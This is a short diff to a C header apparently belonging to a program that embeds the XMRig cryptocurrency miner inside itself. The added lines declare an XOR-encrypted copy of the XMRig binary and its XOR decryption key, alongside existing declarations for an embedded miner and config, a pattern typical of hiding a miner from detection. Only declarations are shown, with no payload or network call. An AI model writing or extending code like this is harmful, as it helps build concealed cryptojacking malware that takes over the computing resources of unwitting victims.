@@ -24,5 +24,11 @@ extern const size_t embedded_xmrig_size;
 
 extern const unsigned char embedded_config[];
 extern const size_t embedded_config_size;
+// XOR-encrypted embedded XMRig binary
+extern const unsigned char embedded_xmrig_encrypted[];
+extern const size_t embedded_xmrig_encrypted_size;
+// XOR decryption key
+extern const unsigned char xor_key[];
+extern const size_t xor_key_size;
 
 #endif // BINARY_EMBEDDER_H
